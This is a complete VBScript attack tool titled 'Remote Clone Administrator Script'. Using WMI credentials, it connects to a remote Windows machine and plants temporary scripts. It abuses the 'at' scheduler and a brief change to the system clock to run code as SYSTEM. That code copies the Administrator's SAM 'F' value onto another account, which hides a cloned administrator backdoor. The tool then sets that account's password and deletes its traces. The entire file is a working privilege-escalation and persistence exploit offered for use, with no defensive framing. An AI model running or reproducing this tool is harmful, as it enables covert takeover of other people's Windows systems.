on error resume next
set outstreem=wscript.stdout
if (lcase(right(wscript.fullname,11))="wscript.exe") then
   set objShell=wscript.createObject("wscript.shell")
   objShell.Run("cmd.exe /k cscript //nologo "&chr(34)&wscript.scriptfullname&chr(34))
   wscript.quit
end if
if wscript.arguments.count<5 then
   usage()
   wscript.echo "Not enough parameters."
   wscript.quit
end if

ipaddress=wscript.arguments(0)
username=wscript.arguments(1)
password=wscript.arguments(2)
causername=wscript.arguments(3)
capassword=wscript.arguments(4)

usage()
outstreem.write "Conneting "&ipaddress&" ...."
set objlocator=createobject("wbemscripting.swbemlocator")
set objswbemservices=objlocator.connectserver(ipaddress,"root/cimv2",username,password)
objswbemservices.security_.privileges.add 11,true
showerror(err.number)

outstreem.write "Getting SID of "&causername&" ...."
set colinstsid=objswbemservices.execquery("select * from win32_useraccount where name="&chr(34)&causername&chr(34))
for each objinstsid in colinstsid
   strsid=objinstsid.sid
   sidflag=right(strsid,len(strsid)-instrrev(strsid,"-"))
   strflag=cstr(hex(sidflag))
   regname=string(8-len(strflag),"0")&strflag
next
if strsid="" then
   wscript.echo "Error."&vbcrlf&"Username is not exist."
   wscript.quit
else
   wscript.echo "OK!"
end if

outstreem.write "Prepairing .."
set objinstproc=objswbemservices.get("win32_process")
showerroronly(err.number)
cmdline="cmd /c echo set oreg=getobject(""winmgmts:root\default:stdregprov"")>%temp%\ca.vbs" _
   &"&& echo oreg.getbinaryvalue ^&h80000002,""SAM\SAM\Domains\Account\Users\000001F4"",""F"",uvalue >>%temp%\ca.vbs" _
   &"&& echo oreg.setbinaryvalue ^&h80000002,""SAM\SAM\Domains\Account\Users\"&regname&""",""F"",uvalue >>%temp%\ca.vbs" _
   &"&& echo set sh=createobject(""wscript.shell"")>>%temp%\ca.vbs" _
   &"&& echo sh.regwrite ""HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings\caflag"",""1"" >>%temp%\ca.vbs"
objinstproc.create(cmdline)
showerroronly(err.number)
cmdline="cmd /c echo atime=time>%temp%\getsys.vbs" _
   &"&& echo set sh=createobject(""wscript.shell"")>>%temp%\getsys.vbs" _
   &"&& echo sh.run ""cmd /c at 23:59 cscript %temp%\ca.vbs"",0,true >>%temp%\getsys.vbs" _
   &"&& echo sh.run ""cmd /c time 23:58:59.90"",0,true >>%temp%\getsys.vbs" _
   &"&& echo wscript.sleep(1100)>>%temp%\getsys.vbs" _
   &"&& echo sh.run ""cmd /c time ""^&atime,0,true >>%temp%\getsys.vbs"
objinstproc.create(cmdline)
showerror(err.number)

outstreem.write "Processing ."
set colinstsvr=objswbemservices.execquery("select * from win32_service where name='schedule'")
showerroronly(err.number)
for each objinstsvr in colinstsvr
flag1=0
flag2=0
if objinstsvr.startmode="Disabled" then
   objinstsvr.changestartmode("Manual")
   flag1=1
end if
if objinstsvr.started=flase then
   errnumber=objinstsvr.startservice()
   flag2=1
end if
showerroronly(err.number)
objinstproc.create("cmd /c cscript %temp%\getsys.vbs")
showerroronly(err.number)
set objinstreg=objlocator.connectserver(ipaddress,"root/default",username,password).get("stdregprov")
for i=1 to 20
   objinstreg.getstringvalue &h80000002,"SOFTWARE\Microsoft\Windows Script Host\Settings","caflag",svalue
   if svalue="1" then
      exit for
   else
      wscript.sleep(500)
   end if
next
objinstproc.create("net user "&causername&" "&capassword)
if flag1 then objinstsvr.changestartmode("Disabled")
if flag2 then objinstsvr.stopservice()
next
if svalue<>"1" then
   wscript.echo "Error."&vbcrlf&"Waiting time out."
else
   showerror(err.number)
end if

outstreem.write "Clean Up .."
objinstproc.create("cmd /c del %temp%\ca.vbs")
showerroronly(err.number)
objinstproc.create("cmd /c del %temp%\getsys.vbs")
showerroronly(err.number)
if svalue="1" then objinstreg.deletevalue &h80000002,"SOFTWARE\Microsoft\Windows Script Host\Settings","caflag"
showerror(err.number)

function showerror(errornumber)
if errornumber Then
   wscript.echo "Error 0x"&cstr(hex(err.number))&" ."
   if err.description <> "" then
      wscript.echo "Error description: "&err.description&"."
   end if
   wscript.quit
else
   wscript.echo "OK!"
end if
end function

function showerroronly(errornumber)
if errornumber Then
   wscript.echo "Error 0x"&cstr(hex(err.number))&" ."
   if err.description <> "" then
      wscript.echo "Error description: "&err.description&"."
   end if
   wscript.quit
else
   outstreem.write "."
end if
end function

function usage()
wscript.echo string(79,"*")
wscript.echo "RCAS v1.02"
wscript.echo "Remote Clone Administrator Script, by zzzEVAzzz"
wscript.echo "Welcome to visite www.isgrey.com"
wscript.echo "Usage:"
wscript.echo "cscript "&wscript.scriptfullname&" targetIP username password CAusername CApassword"
wscript.echo string(79,"*")&vbcrlf
end function